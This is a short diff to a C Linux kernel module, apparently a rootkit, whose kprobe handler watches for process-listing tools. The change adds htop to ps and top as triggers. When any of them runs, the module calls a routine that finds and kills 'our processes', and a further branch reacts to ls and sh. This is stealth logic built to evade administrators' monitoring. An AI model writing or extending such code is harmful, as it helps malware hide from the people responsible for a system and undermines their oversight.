@@ -93,7 +93,7 @@ static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
 	if (killed) {
 		return 0;
 	} 
-	if (strcmp(current->comm, "ps") == 0 || strcmp(current->comm, "top") == 0) { //add htop
+	if (strcmp(current->comm, "ps") == 0 || strcmp(current->comm, "top") == 0 || strcmp(current->comm, "htop") == 0 ) { //add htop
     	find_and_kill_our_processes();
     }
 	if (strcmp(current->comm, "ls") == 0 || strcmp(current->comm, "sh") == 0) { //sh is for the tab autocompletion 
